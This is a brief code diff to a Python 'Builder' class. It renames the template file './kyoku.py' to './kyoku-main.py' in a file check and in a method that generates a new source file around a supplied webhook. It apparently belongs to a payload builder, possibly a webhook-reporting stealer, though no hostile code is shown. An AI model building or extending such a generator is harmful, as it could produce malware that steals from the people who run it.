@@ -167,7 +167,7 @@ class Builder:
         return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(15))
 
     def check(self):
-        required_files = {'./kyoku.py',
+        required_files = {'./kyoku-main.py',
                           './requirements.txt'}
 
         for file in required_files:
@@ -214,7 +214,7 @@ class Builder:
     def mk_file(self, filename, webhook):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
 
-        with open('./kyoku.py', 'r', encoding="utf-8") as f:
+        with open('./kyoku-main.py', 'r', encoding="utf-8") as f:
             code = f.read()
 
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
